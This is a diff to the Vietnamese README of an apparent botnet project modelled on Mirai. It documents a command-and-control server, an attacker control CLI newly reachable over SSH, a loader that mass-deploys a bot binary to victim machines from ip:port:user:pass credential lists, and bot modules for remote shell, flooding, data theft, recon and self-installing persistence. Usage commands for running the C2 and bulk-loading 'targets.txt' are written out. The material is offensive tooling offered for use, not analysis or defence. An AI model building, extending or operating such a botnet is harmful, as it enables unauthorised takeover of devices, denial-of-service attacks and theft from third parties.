@@ -11,7 +11,7 @@ Framework C2 (Command & Control) botnet viết bằng **Python (CNC)** + **C++ (
 ─────────────────────────────                  ─────────────────
 CNC Server (Python)                            Bot (C++ static binary)
 ├── server.py    ← lắng nghe bot kết nối       ├── client       ← kết nối CNC, nhận lệnh
-├── cli.py       ← attacker điều khiển CNC     ├── modules/     ← binary payload (shell, flood, ...)
+├── cli.py       ← attacker điều khiển CNC (Rich UI)     ├── modules/     ← binary payload (shell, flood, ...)
 └── loader.py    ← SSH/Telnet + SCP triển khai └── persistence  ← tự cài vào hệ thống
 ```
 
@@ -29,7 +29,7 @@ loader.py đọc file ip:port:user:pass
 ### Flow vận hành
 
 ```
-cli.py ──(local socket)──→ server.py ──(TLS/TCP)──→ Bot trên máy nạn nhân
+cli.py ──(TCP/SSH)──→ server.py ──(TCP, AES-GCM)──→ Bot trên máy nạn nhân
    │                           │
    │  bots list                ├── quản lý pool bot
    │  bots count               ├── dispatch lệnh
@@ -76,8 +76,8 @@ CLI hỗ trợ:
 
 | Thành phần | Ngôn ngữ | Giải thích |
 |-----------|----------|------------|
-| CNC Server | Python 3.11+ | asyncio, TLS, SQLite |
-| CNC CLI | Python 3.11+ | Kết nối tới server qua Unix socket hoặc TCP local |
+| CNC Server | Python 3.11+ | asyncio, AES-GCM, SQLite |
+| CNC CLI | Python 3.11+ | Rich UI, TCP hoặc SSH để điều khiển |
 | Loader | Python 3.11+ | SSH (paramiko) / Telnet (telnetlib3), SCP |
 | Bot client | C++ (static) | Kết nối CNC, nhận lệnh, chạy module |
 | Bot modules | C++ (static) | Binary compile sẵn: shell, flood, steal, recon |
@@ -94,8 +94,10 @@ Mirai-Botnet-Termux/
 ├── server/                    # CNC — Python (chạy trên máy attacker)
 │   ├── __init__.py
 │   ├── server.py              # CNC server: lắng nghe bot, quản lý pool, dispatch lệnh
-│   ├── cli.py                 # CLI cho attacker: kết nối vào CNC server để ra lệnh
-│   ├── loader.py              # SSH/Telnet bulk loader: đọc ip:port:user:pass, SCP binary
+│   ├── cli.py                 # CLI cho attacker: Rich UI, kết nối TCP/SSH tới CNC
+│   ├── cli_handler.py          # Shared command dispatch (dùng chung cho TCP CLI và SSH)
+│   ├── ssh_cli.py              # SSH server: điều khiển CNC từ xa qua SSH
+│   ├── loader.py               # SSH/Telnet bulk loader: đọc ip:port:user:pass, SCP binary
 │   ├── handler.py             # Xử lý giao thức từng bot: auth, gửi/nhận message
 │   ├── db.py                  # SQLite: bot list, command history, kết quả
 │   └── commands.py            # Định nghĩa lệnh gửi tới bot (shell, flood, ...)
@@ -116,7 +118,6 @@ Mirai-Botnet-Termux/
 ├── scripts/
 │   ├── setup.sh               # Cài dependencies cho CNC (Termux)
 │   ├── build_bot.sh           # Cross-compile bot binary cho tất cả kiến trúc
-│   ├── generate_certs.sh      # Tạo chứng chỉ TLS tự ký
 │   └── cross-toolchains/      # Toolchain cross-compile
 ├── tests/
 │   ├── test_server/
@@ -145,6 +146,9 @@ python -m server.server --config config.yaml
 
 # Mở CLI để điều khiển (terminal khác)
 python -m server.cli
+
+# Hoặc điều khiển từ xa qua SSH
+ssh -o StrictHostKeyChecking=no -p 2222 admin@<cnc-server-ip>
 
 # Triển khai bot hàng loạt (loader)
 python -m server.loader --targets targets.txt --binary dist/bot.arm
